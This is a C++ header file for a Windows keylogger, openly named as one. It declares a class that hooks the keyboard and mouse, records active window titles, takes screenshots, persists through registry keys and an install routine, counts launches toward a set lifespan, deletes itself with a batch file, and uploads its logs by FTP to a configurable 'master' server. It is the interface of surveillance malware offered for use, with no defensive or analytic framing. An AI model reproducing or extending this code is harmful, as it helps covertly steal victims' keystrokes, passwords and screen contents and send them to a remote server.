#ifndef H_KEYLOGGER
#define H_KEYLOGGER

//will activate FTP upload functionality, which needs SFML. Comment out for a full standalone version without FTP upload
#define USE_FTP

#define _WIN32_WINNT 0x0501

#ifdef USE_FTP
#define SFML_STATIC
#endif

#include <windows.h>
#include <iostream>
#include <ctime>
#include <fstream>
#include <string>
#include <sstream>

#ifdef USE_FTP
#include <SFML/Network.hpp>
#endif

#include "screenshot.h"

//registry keys
#define REGKEY_PERSIST "keylogger"
#define REGKEY_LIFETIME "lifespan"

//keyboard scan codes
#define SC_CTRL 29
#define SC_LSHIFT 42
#define SC_ALT 56
#define SC_RSHIFT 54
#define SC_SPACE 57
#define SC_ENTER 28
#define SC_TAB 15
#define SC_BACKSPACE 14
#define SC_CAPSLOCK 58
#define SC_ESCAPE 1

//key to press in order to destroy the keylogger
#define HOTKEY_PURGE NULL

//data folder name
#define DATADIR "data"

//time interval between server uploads
#define UPLOAD_DELTA 60

//name of the batch file used for deleting the program
#define BATCH_NAME "cleaner.bat"

//life time of the keylogger (i.e. number of launches before uninstalling it)
#define KEYLOGGER_LIFETIME "10"

class KeyLogger {

    public:

    //singleton
    static KeyLogger* getInstance();
    static void releaseInstance();

    //starts listenning
    void listen();
    
    //installs a persistent copy
    void install(std::string target);

    //erases program data
    void uninstall();

    //loop for standalone usage
    void loop();
    
    //setup FTP master server
    void setMaster(std::string _server, int _port, std::string _login, std::string _password, std::string _uploadDir = ".");

    //get user home directory
    std::string getUserHomeDirectory();

    //ALT state
    bool KeyLogger::isAltDown() { return altDown; }
    void KeyLogger::setAltDown(bool down) { altDown = down; }

    //CTRL state
    bool KeyLogger::isCtrlDown() { return ctrlDown; }
    void KeyLogger::setCtrlDown(bool down) { ctrlDown = down; }

    //LEFT SHIFT state
    bool KeyLogger::isLShiftDown() { return lshiftDown; }
    void KeyLogger::setLShiftDown(bool down) { lshiftDown = down; }
    
    //RIGHT SHIFT state
    bool KeyLogger::isRShiftDown() { return rshiftDown; }
    void KeyLogger::setRShiftDown(bool down) { rshiftDown = down; }

    protected:

    KeyLogger();
    ~KeyLogger();

    void log(std::string text);

    void removeSelf();

    void freeResources();

    std::string getTimeString();

    std::string screenshot();

    std::string getActiveWindowTitle();

    std::string removeFilespec(std::string path);
    
    void updateLifespan();

    void writeBuffer();

    void upload();
   
    void persist(std::string path = "");

    static LRESULT hookFunction(int nCode, WPARAM wParam, LPARAM lParam);

    static KeyLogger* instance;

    bool altDown;
    bool ctrlDown;
    bool lshiftDown;
    bool rshiftDown;

    HHOOK khook, mhook;
    
    std::ofstream logFile;
    std::stringstream logFileName;

    std::string programDir;
    std::string programPath;

    std::string keyboardBuffer;

    std::string activeWindowTitle;
   
    std::string hostname;

    #ifdef USE_FTP
    time_t lastUpload;
    sf::Ftp ftpClient;
    bool useFTP;
    std::string server, login, password, uploadDir;
    int port;
    #endif
};

#endif // H_KEYLOGGER
